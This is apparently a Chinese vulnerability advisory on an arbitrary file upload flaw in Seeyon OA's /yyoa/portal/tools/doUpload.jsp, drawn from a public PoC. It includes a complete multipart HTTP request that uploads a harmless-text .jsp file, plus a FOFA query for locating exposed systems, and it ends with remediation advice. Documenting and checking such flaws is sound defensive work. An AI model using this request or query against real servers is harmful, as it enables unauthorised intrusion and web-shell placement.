---
source: "https://github.com/R4gd0ll/I-Wanna-Get-All/blob/d8b866af4baed03a338ce8485c25b53875461776/src/main/java/exp/oa/seeyonoa/yyoa/seeyon_yyoa_doUpload_upload.java"
version: "具体受影响版本范围未披露"
fofa: "app=\"致远互联-OA\""
---

# 致远OA yyoa doUpload.jsp 任意文件上传漏洞

## 漏洞描述

致远 OA yyoa 的 `/yyoa/portal/tools/doUpload.jsp` 被公开 PoC 列为文件上传入口。源码通过 `myfile` 表单字段上传 JSP 扩展名的纯文本内容，并在 `/yyoa/portal/upload/` 下访问返回的文件名。文件落地与脚本执行是不同结论。

## 影响范围

具体受影响版本范围未披露。本文按公开 PoC 所列产品记录，不据此扩展为全版本受影响。

## 公开验证方法

```http
POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
Host: example.invalid
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
SL-CE-SUID: 89

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="myfile"; filename="R4g.jsp"
Content-Type: application/octet-stream

Hello R4g
--59229605f98b8cf290a7b8908b34616b--
```

来源的 `att()` 使用纯文本 `Hello R4g`，并调用 `doUpload()` 从响应提取文件名后访问 `/yyoa/portal/upload/<返回的文件名>`。原代码只要求后续访问返回 200；人工核对应进一步确认相同文件内容，排除错误页。`SL-CE-SUID: 89` 是来源请求条件，不能遗漏后再宣称完全无身份条件。本文没有上传 JSP 代码，也不把纯文本读取写成代码执行；仅静态核对公开源码。

## 修复建议

向致远获取适用更新。对上传接口实施服务端身份与权限校验，限制文件类型及存储目录，并禁止上传目录执行脚本。

## 参考链接

- [R4gd0ll/I-Wanna-Get-All 原始 PoC（固定提交）](https://github.com/R4gd0ll/I-Wanna-Get-All/blob/d8b866af4baed03a338ce8485c25b53875461776/src/main/java/exp/oa/seeyonoa/yyoa/seeyon_yyoa_doUpload_upload.java)

## 网络测绘

```text
app="致远互联-OA"
```
